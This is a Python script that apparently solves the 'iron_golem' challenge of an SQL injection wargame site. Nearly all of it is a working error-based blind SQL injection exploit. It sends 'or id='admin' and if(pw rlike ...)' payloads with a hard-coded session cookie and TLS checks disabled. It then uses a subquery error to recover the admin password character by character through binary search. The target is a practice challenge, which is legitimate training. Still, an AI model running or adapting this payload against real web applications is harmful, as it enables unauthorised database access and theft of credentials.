import requests
import string


requests.packages.urllib3.disable_warnings()
req = requests.session()
URL = 'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=%27 or id=%27admin%27 and if(pw rlike "^' 
middle = []
end = '",1,(select 1 union select 2))--+-'
headers = {'Cookie': 'PHPSESSID=87jlucf802cam2hul73if2m2p6'}

syms = string.ascii_lowercase + '0123456789'
count = 0


def check_query(url):
    res = req.get(url, headers=headers, verify=False)
    if 'Subquery' not in res.text:
        return True


def split_string(string):
    mid = len(string) // 2
    first_half = string[:mid]
    second_half = string[mid:]
    return first_half, second_half


def some_func(letters):
    if len(letters) != 1:
        print("Strings: ", letters)
        left, right = split_string(letters)
        if check_query(URL + f"[{left}]" + end):
            return some_func(left)
        else:
            return some_func(right)
    else:
        return letters


for _ in range(32):
    print("In process: ", URL.split('"^')[1])
    URL += some_func(syms)
    

print('Found:', URL.split('"^')[1])